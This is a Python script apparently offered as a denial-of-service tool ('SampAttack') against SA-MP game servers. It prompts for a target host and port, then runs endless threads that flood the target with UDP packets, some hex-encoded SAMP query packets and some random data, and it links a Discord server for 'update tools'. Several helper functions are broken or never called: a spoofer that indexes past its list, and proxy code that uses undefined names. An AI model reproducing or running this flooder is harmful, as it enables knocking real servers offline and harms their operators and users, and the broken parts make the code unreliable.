import socket, struct, codecs, sys, threading, random, time, os

Attack = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]

os.system('cls' if os.name == 'nt' else 'clear')
sys.stdout.write("\x1b]2;[@] ExtrashTools. | User & Password: [root@admin]\x07")
print("""\033[95m
╔═╗═╗ ╦╔╦╗╦═╗╔═╗╔═╗╦ ╦
║╣ ╔╩╦╝ ║ ╠╦╝╠═╣╚═╗╠═╣
╚═╝╩ ╚═ ╩ ╩╚═╩ ╩╚═╝╩ ╩
\u001b[31m
╦ ╦╦╔╦╗╦ ╦            
║║║║ ║ ╠═╣            
╚╩╝╩ ╩ ╩ ╩            
\033[95m
╔╗ ╦╔╦╗╔═╗╔═╗═╗ ╦     
╠╩╗║║║║╔═╝╔═╝╔╩╦╝     
╚═╝╩╩ ╩╚═╝╚═╝╩ ╚═     """)
host = str(input("• Extrash | Host/Ip > "))
port = int(input("• Extrash | Port > "))
threads = int(input("• Extrash | Duration > "))
os.system('cls' if os.name == 'nt' else 'clear')
sys.stdout.write("\x1b]2;[@] SampAttack. | Attacked Sent To {}:{}\x07".format(host, port))
print(f"""
\033[95m            ╔══════════════════════════╦═══════════════════════╗
\033[95m                TARGET HOST / IP : [\033[92m{host}\033[95m]
\033[95m                TARGET PORT : [\033[92m{port}\033[95m]
\033[95m                DURATION : [\033[92m{threads}\033[95m]
\033[95m                METHODS : [\033[92msampattack\033[95m]
\033[95m            ╚═╦═══════════════════════╦╩╦════════════════════╦═╝

\033[95m                  Join Extrash For Next Update Tools
\033[95m                             https://discord.gg/dFCVD2aU2E""")

def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  randip5 = random.randint(1,255)
  randip6 = random.randint(1,255)
  randip7 = random.randint(1,255)
  randip8 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)
  randip.append(randip5)
  randip.append(randip6)
  randip.append(randip7)
  randip.append(randip8)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    addr[4] = str(random.randrange(2, 256))
    addr[5] = str(random.randrange(2, 254))
    addr[6] = str(random.randrange(2, 256))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d + addr[5] + d + addr[6]
    return assemebled

def getproxy():
    global proxies
    f = open(f'{nprox}.txt','wb')
    r = requests.get(urlproxy)
    f.write(r.content)
    f.close()
    proxies = open(f'{nprox}.txt').readlines()

def proxyask():
    global urlproxy
    pro = input(f'[~] Get New List {nprox} [Y] : ')
    if pro == "Y":
        urlproxy = "https://www.proxy-list.download/api/v1/get?type=socks5"
        urlproxy = "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=5000&country=all&ssl=yes&anonymity=all"
        getproxy()
        askthreads()
    else:
        proxyask()  

class Bimzzx(threading.Thread):
    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(min(577,577,577,577,655,577,577,616))
            msg = Attack[random.randrange(0, 3)]
            packets = random._urandom(1024)
            packet = random._urandom(1490)
            pack = random._urandom(666)
            sock.sendto(msg, (host, int(port)))
            sock.sendto(data, (host, int(port)))
            sock.sendto(data, (host, int(port)))
            sock.sendto(data, (host, int(port)))
            sock.sendto(data, (host, int(port)))
            sock.sendto(data, (host, int(port)))
            sock.sendto(pack, (host, int(port)))
            sock.sendto(packet, (host, int(port)))
            sock.sendto(packets, (host, int(port)))
            if int(port) == 7777:
                sock.sendto(Attack[5], (host, int(port)))
            elif int(port) == 7796:
                sock.sendto(Attack[4], (host, int(port)))
            elif int(port) == 7771:
                sock.sendto(Attack[6], (host, int(port)))
            elif int(port) == 7784:
                sock.sendto(Attack[7], (host, int(port)))

if __name__ == '__main__':
    try:
        for x in range(threads):
            extrash = Bimzzx()
            extrash.start()
            time.sleep(0.1)
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print ("╔════════════════════════════════════╗")
        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
        print ("╚════════════════════════════════════╝")
        pass